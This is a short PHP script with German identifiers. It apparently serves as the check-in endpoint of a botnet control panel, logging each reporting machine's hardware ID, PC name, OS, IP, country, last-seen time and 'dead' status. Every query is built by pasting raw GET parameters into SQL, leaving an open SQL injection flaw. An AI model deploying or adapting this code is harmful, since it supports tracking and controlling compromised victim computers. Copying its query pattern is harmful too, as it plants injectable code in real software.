<?php 
require "includes/config.php";
  mysql_connect("$servername", "$dbuser","$dbpass") or die
    ("Keine Verbindung moeglich");
  mysql_select_db("$database") or die
    ("Die Datenbank existiert nicht.");
    
  $hwid = $_GET["hwid"];
  $pcname = $_GET["pcname"];
  $antwort = $_GET["antwort"];
  $os = $_GET["os"];
   
$ip = $_SERVER['REMOTE_ADDR'];
include("includes/geoip.inc.php");
$handle = geoip_open("includes/GeoIP.dat", GEOIP_STANDARD);
$code = geoip_country_code_by_addr($handle, "$ip") ;
geoip_close($handle);

$status = "1";
$ipaddy = $ip;
$country = strtolower($code);
$time = time();
$dead = '0';

$existcheck = mysql_query("SELECT hwid FROM $table WHERE hwid = '$hwid' && dead = '1'");
$existcheck2 = mysql_query("SELECT hwid FROM $table WHERE hwid = '$hwid'");

if(mysql_num_rows($existcheck)==1){
$aendern = "UPDATE $table Set status='1',time=$time,dead='0',answer='$antwort' WHERE hwid = '$hwid'";
mysql_query($aendern);
}elseif(mysql_num_rows($existcheck2)==1){
$aendern2 = "UPDATE $table Set status='1',time=$time,answer='$antwort' WHERE hwid = '$hwid'";
mysql_query($aendern2);
}
else{
   mysql_query("INSERT INTO $table (hwid, status, ip, os, country, time, pcname, answer, dead) VALUES ('$hwid','$status','$ipaddy','$os','$country','$time','$pcname','$antwort','$dead')");
}

?>